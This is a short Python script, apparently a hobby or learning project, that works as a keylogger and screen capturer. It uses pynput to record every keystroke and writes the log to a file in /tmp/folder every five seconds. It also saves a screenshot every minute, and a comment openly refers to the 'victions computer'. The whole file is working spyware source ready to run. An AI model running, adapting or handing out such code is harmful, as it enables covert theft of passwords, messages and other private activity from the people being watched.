#!/usr/bin/env python3
'''
Name : Alexis Rodriguez
Date : 2020-02-09
'''
from pynput import keyboard
import threading
import pyautogui as pygrab
import sys
import os
import time

log = ''
'''
make directory in /tmp folder
'''
def make_dir():
	try:
		dir_to_create = "/tmp/folder/"
		os.mkdir(dir_to_create)
	except OSError:
		pass
	return dir_to_create

'''
Handles the action taken when a 
key is pressed.
'''
def on_press(key):
	global log
	try:
		log += str(key.char)
	# handling special characters
	except AttributeError:
		if key == key.space:
			log += ' '
		elif key == key.enter: log += '\n'
		elif key == key.backspace: log += ''
		elif key == key.ctrl: log += ' ctrl+'
		else:
			log += str(key)

'''
Logging to a file every 5 seconds
'''
def log_to_file():
	global log
	file_to_create = sys.argv[1]
	f = open(make_dir() + sys.argv[1], 'w')
	f.write(log)
	clock = threading.Timer(5, log_to_file)
	clock.start()

'''
get time image was taken append it to 
the name of the images file
'''
def make_image_name():
	seconds_since_epoch = time.time()
	date = time.ctime(seconds_since_epoch).split()
	return date[1] + '_' + date[2] + '_' + date[3]

'''
Take a screenshot of the victions computer
every minute and save it to /tmp/folder directory
'''
def save_screen():
	image = pygrab.screenshot()
	time = make_image_name()
	image.save(r'/tmp/folder/normal_' + time + '.png')
	take_screen = threading.Timer(60, save_screen)
	take_screen.start()


def main():
	global log
	make_dir()
	save_screen()
	# start the keylogger
	with keyboard.Listener(
		on_press=on_press) as listener:
		log_to_file()
		listener.join()

main()